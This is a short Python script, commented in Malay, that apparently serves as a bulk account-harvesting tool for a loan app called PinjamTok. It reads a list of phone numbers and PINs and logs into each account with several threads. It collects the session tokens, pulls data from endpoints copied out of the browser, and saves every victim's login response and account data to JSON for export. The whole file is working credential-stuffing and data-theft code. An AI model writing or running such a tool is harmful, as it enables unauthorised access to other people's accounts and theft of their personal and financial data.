#!/usr/bin/env python3
"""Kutip data akaun PinjamTok. Guna: python3 dump_akaun.py akaun.txt

endpoints_data dalam config.json mesti diisi dulu (dari tab Network).
"""
import argparse, json, os, sys
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from lib.http import post, get, berjaya
from lib.util import normal, simpan_json, baca_json, eksport, jeda, DIR

CFG = json.load(open("config.json"))["pinjamtok"]
URL = CFG["base"] + CFG["login"]
KUNCI = CFG["success_keys"]


def proses(tel, pin):
    tel = normal(tel)
    nama = tel.replace("+", "") + ".json"
    if baca_json(nama):
        print(f"[LANGKAU] {tel}")
        return

    st, login = post(URL, {CFG["login_fields"][0]: tel, CFG["login_fields"][1]: pin})
    if not berjaya(st, login, KUNCI):
        print(f"[GAGAL] {tel} -> {login.get('error') or login.get('message')}")
        return

    tok = next((login.get(k) for k in KUNCI if login.get(k)), None)
    if not tok:
        d = login.get("data") or {}
        tok = next((d.get(k) for k in KUNCI if isinstance(d, dict) and d.get(k)), None)

    rekod = {"telefon": tel, "pin": pin, "login": login}
    for ep in CFG["endpoints_data"]:
        st2, j = get(CFG["base"] + ep, tok)
        rekod[ep.strip("/").replace("/", "_")] = j

    simpan_json(nama, rekod)
    print(f"[OK] {tel}")
    jeda()


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("fail")
    ap.add_argument("--pekerja", type=int, default=3)
    a = ap.parse_args()

    baris = [b.strip() for b in open(a.fail, encoding="utf-8")
             if b.strip() and not b.startswith("#") and "," in b]
    with ThreadPoolExecutor(max_workers=a.pekerja) as ex:
        list(ex.map(lambda b: proses(*b.split(",", 1)), baris))

    semua = []
    if os.path.isdir(DIR):
        for n in sorted(os.listdir(DIR)):
            if n.endswith(".json"):
                semua.append(json.load(open(os.path.join(DIR, n), encoding="utf-8")))
    eksport(semua)


if __name__ == "__main__":
    main()